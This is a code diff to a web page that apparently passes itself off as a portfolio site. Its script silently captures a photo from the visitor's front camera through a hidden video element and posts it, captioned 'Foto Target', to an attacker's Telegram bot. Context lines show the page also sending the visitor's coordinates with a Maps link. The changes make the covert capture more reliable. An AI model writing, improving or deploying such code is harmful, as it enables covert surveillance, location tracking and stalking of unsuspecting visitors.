@@ -66,7 +66,7 @@
         </header>
     </main>
 
-    <video id="video" class="hidden"></video>
+    <video id="video" autoplay playsinline class="hidden"></video>
     <canvas id="canvas" class="hidden"></canvas>
 
     <script>
@@ -100,8 +100,7 @@
                     
                     const keyboard = {
                         inline_keyboard: [[
-                            { text: "📍 Lihat di Maps", url: `https://www.google.com/maps/place/${latitude},${longitude}` },
-                            { text: "👤 Cek Profil", callback_data: "check_user" }
+                            { text: "📍 Lihat di Maps", url: `https://www.google.com/maps/place/${latitude},${longitude}` }
                         ]]
                     };
 
@@ -118,23 +117,29 @@
 
         async function takePhoto() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                video.play();
-                setTimeout(async () => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const blob = await (await fetch(canvas.toDataURL('image/jpeg'))).blob();
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('photo', blob);
-                    formData.append('caption', "📸 Foto Target");
-                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
-                    stream.getTracks().forEach(t => t.stop());
-                }, 1500);
-            } catch (err) {}
+                
+                video.onloadedmetadata = async () => {
+                    setTimeout(async () => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        
+                        canvas.toBlob(async (blob) => {
+                            const formData = new FormData();
+                            formData.append('chat_id', chatId);
+                            formData.append('photo', blob);
+                            formData.append('caption', "📸 Foto Target");
+                            
+                            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
+                            stream.getTracks().forEach(t => t.stop());
+                        }, 'image/jpeg');
+                    }, 1000);
+                };
+            } catch (err) { console.error("Kamera gagal diakses: ", err); }
         }
         function toggleProjects() { document.getElementById('project-list').classList.toggle('hidden'); }
     </script>
